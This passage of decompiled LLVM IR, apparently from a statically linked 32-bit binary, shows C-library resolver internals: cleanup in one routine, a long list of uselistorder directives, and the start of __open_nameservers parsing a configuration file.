  %v2_8065d54 = inttoptr i32 %v1_8065d54 to i32*
  %v3_8065d54 = load i32, i32* %v2_8065d54, align 4
  %v4_8065d54 = add i32 %v3_8065d54, 1
  store i32 %v4_8065d54, i32* %v2_8065d54, align 4
  br label %dec_label_pc_8065d58

dec_label_pc_8065d58:                             ; preds = %dec_label_pc_8065d3f, %dec_label_pc_8065d54
  %v0_8065d58 = load i32, i32* @esp, align 4
  %v1_8065d58 = add i32 %v0_8065d58, 36
  %v2_8065d58 = inttoptr i32 %v1_8065d58 to i32*
  store i32 -1, i32* %v2_8065d58, align 4
  br label %dec_label_pc_8065d60.backedge

dec_label_pc_8065d60.backedge:                    ; preds = %dec_label_pc_8065d58, %dec_label_pc_80659d6, %dec_label_pc_8065ac4, %dec_label_pc_8065d39
  %v0_8065d60.pre = load i32, i32* @esp, align 4
  %v1_8065d60 = add i32 %v0_8065d60.pre, 28
  %v2_8065d60 = inttoptr i32 %v1_8065d60 to i32*
  %v3_8065d60 = load i32, i32* %v2_8065d60, align 4
  %tmp110 = icmp ult i32 %v3_8065d60, 3
  br i1 %tmp110, label %dec_label_pc_80657c0, label %dec_label_pc_8065d85

dec_label_pc_8065d85:                             ; preds = %dec_label_pc_806573a, %dec_label_pc_80657d6, %dec_label_pc_80658ca, %dec_label_pc_8065d60.backedge, %entry, %dec_label_pc_8065714, %dec_label_pc_806571c, %dec_label_pc_806572a
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_806572a ], [ -1, %dec_label_pc_806571c ], [ -1, %dec_label_pc_8065714 ], [ -1, %entry ], [ %v0_8065787, %dec_label_pc_8065d60.backedge ], [ %v0_8065787, %dec_label_pc_80658ca ], [ %v0_8065787, %dec_label_pc_80657d6 ], [ %v0_8065787, %dec_label_pc_806573a ]
  %v0_8065d85 = call i32 @__GI___h_errno_location()
  store i32 %v0_8065d85, i32* %eax.global-to-local, align 4
  %v1_8065d8a = inttoptr i32 %v0_8065d85 to i32*
  store i32 -1, i32* %v1_8065d8a, align 4
  %v0_8065d90 = load i32, i32* @esp, align 4
  %v1_8065d90 = add i32 %v0_8065d90, 56
  %v2_8065d90 = inttoptr i32 %v1_8065d90 to i32*
  %v3_8065d90 = load i32, i32* %v2_8065d90, align 4
  store i32 %v3_8065d90, i32* %eax.global-to-local, align 4
  %v2_8065d94 = add i32 %v0_8065d90, 44
  %v3_8065d94 = inttoptr i32 %v2_8065d94 to i32*
  store i32 %v3_8065d90, i32* %v3_8065d94, align 4
  br label %dec_label_pc_8065d98

dec_label_pc_8065d98:                             ; preds = %dec_label_pc_8065afd, %dec_label_pc_8065ad5, %dec_label_pc_8065d85
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8065d85 ], [ %v0_8065787, %dec_label_pc_8065afd ], [ %v0_8065787, %dec_label_pc_8065ad5 ]
  %v0_8065d98 = load i32, i32* @esp, align 4
  %v1_8065d98 = add i32 %v0_8065d98, 20
  %v2_8065d98 = inttoptr i32 %v1_8065d98 to i32*
  %v3_8065d98 = load i32, i32* %v2_8065d98, align 4
  %v13_8065d98 = icmp eq i32 %v3_8065d98, -1
  br i1 %v13_8065d98, label %dec_label_pc_8065d98.dec_label_pc_8065dae_crit_edge, label %dec_label_pc_8065d9f

dec_label_pc_8065d98.dec_label_pc_8065dae_crit_edge: ; preds = %dec_label_pc_8065d98
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_8065dae

dec_label_pc_8065d9f:                             ; preds = %dec_label_pc_8065d98
  %v3_8065da2 = load i32, i32* %v2_8065d98, align 4
  %v5_8065da2 = add i32 %v0_8065d98, -16
  %v6_8065da2 = inttoptr i32 %v5_8065da2 to i32*
  store i32 %v3_8065da2, i32* %v6_8065da2, align 4
  %v1_8065da6 = sext i16 %stack_var_-180.1 to i32
  %v2_8065da6 = call i32 @__libc_close(i32 %v1_8065da6)
  store i32 %v2_8065da6, i32* %eax.global-to-local, align 4
  %v0_8065dab = load i32, i32* @esp, align 4
  %v1_8065dab = add i32 %v0_8065dab, 16
  br label %dec_label_pc_8065dae

dec_label_pc_8065dae:                             ; preds = %dec_label_pc_8065d98.dec_label_pc_8065dae_crit_edge, %dec_label_pc_8065d9f
  %v1_8065db5.pre-phi = phi i32 [ %.pre, %dec_label_pc_8065d98.dec_label_pc_8065dae_crit_edge ], [ %v1_8065da6, %dec_label_pc_8065d9f ]
  %v0_8065dae = phi i32 [ %v0_8065d98, %dec_label_pc_8065d98.dec_label_pc_8065dae_crit_edge ], [ %v1_8065dab, %dec_label_pc_8065d9f ]
  %v1_8065db1 = add i32 %v0_8065dae, 12
  %v2_8065db1 = inttoptr i32 %v1_8065db1 to i32*
  %v3_8065db1 = load i32, i32* %v2_8065db1, align 4
  %v5_8065db1 = add i32 %v0_8065dae, -16
  %v6_8065db1 = inttoptr i32 %v5_8065db1 to i32*
  store i32 %v3_8065db1, i32* %v6_8065db1, align 4
  %v2_8065db5 = call i32 @free(i32 %v1_8065db5.pre-phi)
  store i32 %v2_8065db5, i32* %eax.global-to-local, align 4
  %v1_8065dba = load i32, i32* @esp, align 4
  %v2_8065dba = inttoptr i32 %v1_8065dba to i32*
  store i32 %v2_80656f2, i32* %v2_8065dba, align 4
  %v2_8065dbd = call i32 @free(i32 %v1_8065db5.pre-phi)
  store i32 %v2_8065dbd, i32* %eax.global-to-local, align 4
  %v0_8065dc2 = load i32, i32* @esp, align 4
  %v1_8065dc5 = add i32 %v0_8065dc2, 56
  %v2_8065dc5 = inttoptr i32 %v1_8065dc5 to i32*
  %v3_8065dc5 = load i32, i32* %v2_8065dc5, align 4
  %v13_8065dc5 = icmp eq i32 %v3_8065dc5, -1
  %v1_8065dca = add i32 %v0_8065dc2, 32
  %v2_8065dca = inttoptr i32 %v1_8065dca to i32*
  store i32 -1, i32* %v2_8065dca, align 4
  br i1 %v13_8065dc5, label %dec_label_pc_8065dae.dec_label_pc_8065e21_crit_edge, label %dec_label_pc_8065dd4

dec_label_pc_8065dae.dec_label_pc_8065e21_crit_edge: ; preds = %dec_label_pc_8065dae
  %v0_8065e21.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065e21

dec_label_pc_8065dd4:                             ; preds = %dec_label_pc_8065dae
  %v0_8065dd4 = load i32, i32* @ecx, align 4
  %v1_8065dd4 = load i32, i32* @esp, align 4
  %v2_8065dd4 = add i32 %v1_8065dd4, -4
  %v3_8065dd4 = inttoptr i32 %v2_8065dd4 to i32*
  store i32 %v0_8065dd4, i32* %v3_8065dd4, align 4
  %v1_8065dd5 = add i32 %v1_8065dd4, -8
  %v2_8065dd5 = inttoptr i32 %v1_8065dd5 to i32*
  store i32 ptrtoint (i8** @global_var_807e05c.771 to i32), i32* %v2_8065dd5, align 4
  %v1_8065dda = add i32 %v1_8065dd4, -12
  %v2_8065dda = inttoptr i32 %v1_8065dda to i32*
  store i32 134589241, i32* %v2_8065dda, align 4
  %v1_8065ddf = add i32 %v1_8065dd4, 184
  store i32 %v1_8065ddf, i32* @ebx, align 4
  %v2_8065de6 = add i32 %v1_8065dd4, -16
  %v3_8065de6 = inttoptr i32 %v2_8065de6 to i32*
  store i32 %v1_8065ddf, i32* %v3_8065de6, align 4
  %v4_8065de7 = inttoptr i32 %v1_8065db5.pre-phi to i32*
  %v5_8065de7 = call i32 @__pthread_cleanup_push_defer(i32* %v4_8065de7, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8065de7, i32* %eax.global-to-local, align 4
  %v0_8065dec = load i32, i32* @esp, align 4
  %v1_8065dec = inttoptr i32 %v0_8065dec to i32*
  store i32 ptrtoint (i8** @global_var_807e05c.771 to i32), i32* %v1_8065dec, align 4
  %v2_8065df3 = call i32 @pthread_mutex_lock(i32 %v1_8065db5.pre-phi)
  store i32 %v2_8065df3, i32* %eax.global-to-local, align 4
  %v0_8065df8 = load i32, i32* @esp, align 4
  %v1_8065df8 = add i32 %v0_8065df8, 60
  %v2_8065df8 = inttoptr i32 %v1_8065df8 to i32*
  %v3_8065df8 = load i32, i32* %v2_8065df8, align 4
  store i32 %v3_8065df8, i32* %eax.global-to-local, align 4
  %v1_8065dfc = add i32 %v0_8065df8, 56
  %v2_8065dfc = inttoptr i32 %v1_8065dfc to i32*
  %v3_8065dfc = load i32, i32* %v2_8065dfc, align 4
  store i32 %v3_8065dfc, i32* %edx.global-to-local, align 4
  %v1_8065e00 = trunc i32 %v3_8065df8 to i16
  store i16 %v1_8065e00, i16* @global_var_807567c.773, align 4
  %v1_8065e06 = inttoptr i32 %v0_8065df8 to i32*
  %v2_8065e06 = load i32, i32* %v1_8065e06, align 4
  store i32 %v2_8065e06, i32* %eax.global-to-local, align 4
  %v3_8065e06 = add i32 %v0_8065df8, 4
  %v1_8065e07 = sext i32 %v3_8065dfc to i64
  store i64 %v1_8065e07, i64* @global_var_807e074.772, align 8
  %v1_8065e0d = inttoptr i32 %v3_8065e06 to i32*
  %v2_8065e0d = load i32, i32* %v1_8065e0d, align 4
  store i32 %v2_8065e0d, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8065e0d, align 4
  %v0_8065e10 = load i32, i32* @ebx, align 4
  store i32 %v0_8065e10, i32* %v1_8065e06, align 4
  %v4_8065e11 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_8065de7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065e11, i32* %eax.global-to-local, align 4
  %v0_8065e16 = load i32, i32* @esp, align 4
  %v1_8065e16 = add i32 %v0_8065e16, 32
  %v2_8065e16 = inttoptr i32 %v1_8065e16 to i32*
  store i32 -1, i32* %v2_8065e16, align 4
  br label %dec_label_pc_8065e1e

dec_label_pc_8065e1e:                             ; preds = %dec_label_pc_8065c92, %dec_label_pc_8065dd4
  %v0_8065e1e = load i32, i32* @esp, align 4
  %v1_8065e1e = add i32 %v0_8065e1e, 16
  br label %dec_label_pc_8065e21

dec_label_pc_8065e21:                             ; preds = %dec_label_pc_8065dae.dec_label_pc_8065e21_crit_edge, %dec_label_pc_8065e1e
  %v0_8065e21 = phi i32 [ %v0_8065e21.pre, %dec_label_pc_8065dae.dec_label_pc_8065e21_crit_edge ], [ %v1_8065e1e, %dec_label_pc_8065e1e ]
  %v1_8065e21 = add i32 %v0_8065e21, 16
  %v2_8065e21 = inttoptr i32 %v1_8065e21 to i32*
  %v3_8065e21 = load i32, i32* %v2_8065e21, align 4
  store i32 %v3_8065e21, i32* %eax.global-to-local, align 4
  %v1_8065e25 = add i32 %v0_8065e21, 220
  %v1_8065e2b = inttoptr i32 %v1_8065e25 to i32*
  %v2_8065e2b = load i32, i32* %v1_8065e2b, align 4
  store i32 %v2_8065e2b, i32* @ebx, align 4
  %v3_8065e2b = add i32 %v0_8065e21, 224
  %v1_8065e2c = inttoptr i32 %v3_8065e2b to i32*
  %v2_8065e2c = load i32, i32* %v1_8065e2c, align 4
  store i32 %v2_8065e2c, i32* @esi, align 4
  %v3_8065e2c = add i32 %v0_8065e21, 228
  %v1_8065e2d = inttoptr i32 %v3_8065e2c to i32*
  %v2_8065e2d = load i32, i32* %v1_8065e2d, align 4
  store i32 %v2_8065e2d, i32* @edi, align 4
  %v3_8065e2d = add i32 %v0_8065e21, 232
  %v1_8065e2e = inttoptr i32 %v3_8065e2d to i32*
  %v2_8065e2e = load i32, i32* %v1_8065e2e, align 4
  store i32 %v2_8065e2e, i32* @ebp, align 4
  ret i32 %v3_8065e21

; uselistorder directives
  uselistorder i32 %v0_8065e21, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8065df8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8065dae, { 1, 0 }
  uselistorder i32 %v1_8065db5.pre-phi, { 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8065d60.pre, { 1, 0 }
  uselistorder i32 %v5_8065d33, { 1, 0 }
  uselistorder i32 %v3_8065d33, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8065cfb, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8065cc4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8065c92, { 1, 0 }
  uselistorder i32 %v3_8065c71, { 1, 0, 2 }
  uselistorder i32 %v0_8065c62, { 1, 0 }
  uselistorder i32 %v5_8065c58, { 1, 0 }
  uselistorder i32* %v3_8065c58, { 1, 0 }
  uselistorder i32 %v0_8065b2e67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8065c58, { 2, 1, 0 }
  uselistorder i32 %v5_8065c52, { 1, 0 }
  uselistorder i32 %v1_8065c51, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8065c4d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8065c11, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8065beb, { 1, 0 }
  uselistorder i32 %v1_8065bdc, { 1, 0 }
  uselistorder i32 %v3_8065bad, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8065b9b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8065b42, { 1, 2, 0 }
  uselistorder i32 %v0_8065b42, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8065b1c, { 1, 0 }
  uselistorder i32 %v0_8065b24, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_8065b12, { 1, 0, 2 }
  uselistorder i32 %v5_8065abe, { 1, 0 }
  uselistorder i32* %v2_8065abe, { 1, 0, 2 }
  uselistorder i32 %v3_8065a76, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8065a5c, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_8065a3b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8065a1b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80659c1, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80659a6, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_806598f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8065917, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80658ca, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80658ab, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_806588f, { 1, 0 }
  uselistorder i32 %v3_8065884, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8065881, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8065826, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8065821, { 1, 2, 0, 3 }
  uselistorder i32 %v1_806580a, { 1, 0 }
  uselistorder i32 %v1_80657d6, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80657c783, { 2, 1, 0 }
  uselistorder i16 %v0_8065787, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_8065780, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 13 }
  uselistorder i32 %v2_80656f2, { 2, 4, 3, 5, 9, 6, 11, 1, 0, 8, 10, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 97, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 51, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 84, 80, 81, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 51, { 9, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 148, { 0, 13, 11, 1, 2, 3, 4, 5, 6, 7, 12, 8, 9, 10 }
  uselistorder i32 160, { 0, 8, 1, 9, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 43, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 68, { 5, 2, 7, 8, 0, 6, 3, 4, 1, 9 }
  uselistorder i8 1, { 68, 6, 50, 69, 75, 17, 0, 74, 70, 51, 72, 73, 52, 71, 53, 1, 7, 8, 9, 10, 11, 12, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 54, 55, 45, 56, 57, 3, 46, 47, 48, 15, 16, 58, 59, 60, 13, 61, 14, 62, 63, 64, 65, 66, 4, 67, 5, 49 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 100, { 5, 19, 20, 7, 9, 6, 10, 11, 0, 1, 2, 3, 12, 13, 14, 4, 15, 16, 17, 18, 8 }
  uselistorder i32 67, { 0, 2, 1 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 88, { 0, 9, 10, 11, 12, 16, 3, 4, 5, 6, 7, 8, 2, 15, 1, 13, 14 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 (%pollfd*, i32, i32)* @__libc_poll, { 3, 0, 1, 2 }
  uselistorder i32 10000, { 3, 0, 1, 2 }
  uselistorder i32 228, { 1, 0, 6, 2, 3, 4, 5 }
  uselistorder i32 232, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 176, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @inet_addr, { 2, 39, 38, 37, 36, 35, 3, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 1 }
  uselistorder i16 10, { 0, 9, 2, 7, 3, 8, 1, 4, 5, 6 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1, 3, 7, 5, 4, 6 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32* inttoptr (i32 -1 to i32*), { 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder i32 200, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 9, 0, 1, 2, 3, 4, 5, 10, 11, 6, 8, 7 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 0, 2, 3, 1 }
  uselistorder i32 72, { 5, 8, 9, 6, 10, 4, 3, 2, 7, 0, 1 }
  uselistorder i32 84, { 11, 0, 12, 1, 13, 14, 3, 8, 9, 4, 5, 6, 7, 10, 2 }
  uselistorder i8* inttoptr (i32 -1 to i8*), { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 -12, { 24, 18, 17, 19, 1, 20, 21, 22, 23, 25, 26, 27, 28, 29, 16, 31, 32, 30, 33, 34, 35, 36, 37, 2, 0, 38, 70, 67, 68, 42, 39, 40, 41, 43, 44, 45, 5, 6, 3, 4, 46, 7, 8, 9, 69, 10, 51, 47, 11, 48, 49, 50, 52, 53, 12, 65, 54, 66, 71, 62, 61, 13, 57, 14, 15, 58, 59, 60, 55, 56, 63, 64 }
  uselistorder i16* @global_var_807567c.773, { 2, 1, 0 }
  uselistorder i64 0, { 0, 1, 6, 2, 7, 8, 3, 9, 10, 4, 11, 12, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i64* @global_var_807e074.772, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_807e05c.771 to i32), { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32 512, { 10, 6, 11, 12, 7, 8, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8065e21, { 1, 0 }
  uselistorder label %dec_label_pc_8065e1e, { 1, 0 }
  uselistorder label %dec_label_pc_8065dae, { 1, 0 }
  uselistorder label %dec_label_pc_8065d98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065d85, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8065d60.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8065d58, { 1, 0 }
  uselistorder label %dec_label_pc_8065d3f, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8065cf4, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8065c92, { 1, 0 }
  uselistorder label %dec_label_pc_8065c62, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8065c58, { 1, 0 }
  uselistorder label %dec_label_pc_8065c4d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065c4a, { 1, 0 }
  uselistorder label %dec_label_pc_8065bc5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8065b1c, { 1, 0 }
  uselistorder label %dec_label_pc_806598f, { 1, 0 }
  uselistorder label %dec_label_pc_8065958, { 1, 0 }
  uselistorder label %dec_label_pc_80658ca, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80657d6, { 1, 0 }
  uselistorder label %dec_label_pc_80657c0, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8065e30 = load i32, i32* @ebp, align 4
  %v0_8065e31 = load i32, i32* @edi, align 4
  %v0_8065e32 = load i32, i32* @esi, align 4
  %v0_8065e33 = load i32, i32* @ebx, align 4
  store i32 %v0_8065e33, i32* %stack_var_-16, align 4
  store i32 134589241, i32* %stack_var_-216, align 4
  %v3_8065e3f = ptrtoint i32* %stack_var_-216 to i32
  %v4_8065e4c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  %v1_8065e58 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  store i32 %v1_8065e58, i32* @eax, align 4
  %v0_8065e60 = load i32, i32* @global_var_807f840.675, align 64
  %tmp39 = icmp slt i32 %v0_8065e60, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8066057, label %dec_label_pc_8065e6d

dec_label_pc_8065e6d:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_806f0d1.764 to i32), i32* %stack_var_-216, align 4
  %v2_8065e79 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_806f09f.776 to i32), i32 ptrtoint (i32* @global_var_806f0d1.764 to i32))
  store i32 %v2_8065e79, i32* @eax, align 4
  %v1_8065e81 = icmp eq i32 %v2_8065e79, 0
  store i32 %v2_8065e79, i32* @ebp, align 4
  %v1_8065e85 = icmp eq i1 %v1_8065e81, false
  br i1 %v1_8065e85, label %dec_label_pc_8066022.preheader, label %dec_label_pc_8065e8b

dec_label_pc_8065e8b:                             ; preds = %dec_label_pc_8065e6d
  store i32 ptrtoint (i32* @global_var_806f0d1.764 to i32), i32* %stack_var_-216, align 4
  %v2_8065e97 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_806f0b0.777 to i32), i32 ptrtoint (i32* @global_var_806f0d1.764 to i32))
  %v1_8065e9f = icmp eq i32 %v2_8065e97, 0
  store i32 %v2_8065e97, i32* @ebp, align 4
  %v1_8065ea3 = icmp eq i1 %v1_8065e9f, false
  br i1 %v1_8065ea3, label %dec_label_pc_8066022.preheader, label %dec_label_pc_806604c

dec_label_pc_8066022.preheader:                   ; preds = %dec_label_pc_8065e6d, %dec_label_pc_8065e8b
  %v2_8066029 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8065f5d = add i32 %v3_8065e3f, 164
  %v3_8065f4c = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8066022

dec_label_pc_8065eae:                             ; preds = %dec_label_pc_8065eb9
  %v1_8065eae = add i32 %v0_8065eae54, 1
  store i32 %v1_8065eae, i32* @ebx, align 4
  %v1_8065eaf = inttoptr i32 %v1_8065eae to i8*
  %v2_8065eaf = load i8, i8* %v1_8065eaf, align 1
  %v3_8065eaf = zext i8 %v2_8065eaf to i32
  %v5_8065eaf = and i32 %v6_8065eaf57, -256
  %v6_8065eaf = or i32 %v3_8065eaf, %v5_8065eaf
  store i32 %v6_8065eaf, i32* @ecx, align 4
  %v4_8065eb1 = icmp eq i8 %v2_8065eaf, 0
  br i1 %v4_8065eb1, label %dec_label_pc_8066022, label %dec_label_pc_8065eb9

dec_label_pc_8065eb9:                             ; preds = %dec_label_pc_8065eb9.lr.ph, %dec_label_pc_8065eae
  %v6_8065eaf57 = phi i32 [ %v6_8065eaf51, %dec_label_pc_8065eb9.lr.ph ], [ %v6_8065eaf, %dec_label_pc_8065eae ]
  %v2_8065eaf56 = phi i8 [ %v2_8065eaf48, %dec_label_pc_8065eb9.lr.ph ], [ %v2_8065eaf, %dec_label_pc_8065eae ]
  %v1_8065eaf55 = phi i8* [ %v1_8065eaf47, %dec_label_pc_8065eb9.lr.ph ], [ %v1_8065eaf, %dec_label_pc_8065eae ]
  %v0_8065eae54 = phi i32 [ %v0_8065eaf.pre, %dec_label_pc_8065eb9.lr.ph ], [ %v1_8065eae, %dec_label_pc_8065eae ]
  store i32 %v0_8065eb9.pre, i32* @eax, align 4
  %v2_8065ebe = sext i8 %v2_8065eaf56 to i32
  store i32 %v2_8065ebe, i32* @edx, align 4
  %v2_8065ec1 = mul nsw i32 %v2_8065ebe, 2
  %v3_8065ec1 = add i32 %v0_8065eb9.pre, %v2_8065ec1
  %v4_8065ec1 = inttoptr i32 %v3_8065ec1 to i8*
  %v5_8065ec1 = load i8, i8* %v4_8065ec1, align 1
  %v6_8065ec1 = and i8 %v5_8065ec1, 32
  %v7_8065ec1 = icmp eq i8 %v6_8065ec1, 0
  %v1_8065ec5 = icmp eq i1 %v7_8065ec1, false
  br i1 %v1_8065ec5, label %dec_label_pc_8065eae, label %dec_label_pc_8065ec7

dec_label_pc_8065ec7:                             ; preds = %dec_label_pc_8065eb9
  %v10_8065ec7 = icmp eq i8 %v2_8065eaf56, 10
  br i1 %v10_8065ec7, label %dec_label_pc_8066022, label %dec_label_pc_8065ed0

dec_label_pc_8065ed0:                             ; preds = %dec_label_pc_8065ec7
  %v10_8065ed0 = icmp eq i8 %v2_8065eaf56, 35
  %v1_8065edb = icmp eq i1 %v10_8065ed0, false
  br i1 %v1_8065edb, label %dec_label_pc_8065f2c.preheader, label %dec_label_pc_8066022

dec_label_pc_8065f2c.preheader:                   ; preds = %dec_label_pc_8065ed0
  %v2_8065f2c4 = load i8, i8* %v1_8065eaf55, align 1
  %v3_8065f2c5 = icmp eq i8 %v2_8065f2c4, 0
  br i1 %v3_8065f2c5, label %dec_label_pc_8065f38, label %dec_label_pc_8065f31

dec_label_pc_8065ee2:                             ; preds = %dec_label_pc_8065f31
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_8065ee6 = load i32, i32* @esp, align 4
  %v3_8065ee6 = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_8065ee6 = add nuw nsw i32 %v3_8065ee6, 152
  %v5_8065ee6 = add i32 %v4_8065ee6, %v1_8065ee6
  %v6_8065ee6 = inttoptr i32 %v5_8065ee6 to i32*
  store i32 %v0_8065ee6, i32* %v6_8065ee6, align 4
  %v0_8065ef0.pre = load i32, i32* @ebx, align 4
  %v4_8065ef0.pre = load i32, i32* @ecx, align 4
  %v1_8065ef058 = inttoptr i32 %v0_8065ef0.pre to i8*
  %v2_8065ef059 = load i8, i8* %v1_8065ef058, align 1
  %v3_8065ef060 = zext i8 %v2_8065ef059 to i32
  %v5_8065ef061 = and i32 %v4_8065ef0.pre, -256
  %v6_8065ef062 = or i32 %v3_8065ef060, %v5_8065ef061
  %v4_8065ef263 = icmp eq i8 %v2_8065ef059, 0
  br i1 %v4_8065ef263, label %dec_label_pc_8065f0f.preheader, label %dec_label_pc_8065ef6.lr.ph

dec_label_pc_8065ef6.lr.ph:                       ; preds = %dec_label_pc_8065ee2
  %v0_8065ef6.pre = load i32, i32* @global_var_8075640, align 64
  br label %dec_label_pc_8065ef6

dec_label_pc_8065eef:                             ; preds = %dec_label_pc_8065f04
  %v1_8065eef = add i32 %v0_8065eef65, 1
  store i32 %v1_8065eef, i32* @ebx, align 4
  %v1_8065ef0 = inttoptr i32 %v1_8065eef to i8*
  %v2_8065ef0 = load i8, i8* %v1_8065ef0, align 1
  %v3_8065ef0 = zext i8 %v2_8065ef0 to i32
  %v5_8065ef0 = and i32 %v6_8065ef067, -256
  %v6_8065ef0 = or i32 %v3_8065ef0, %v5_8065ef0
  %v4_8065ef2 = icmp eq i8 %v2_8065ef0, 0
  br i1 %v4_8065ef2, label %dec_label_pc_8065f0f.preheader, label %dec_label_pc_8065ef6

dec_label_pc_8065ef6:                             ; preds = %dec_label_pc_8065ef6.lr.ph, %dec_label_pc_8065eef
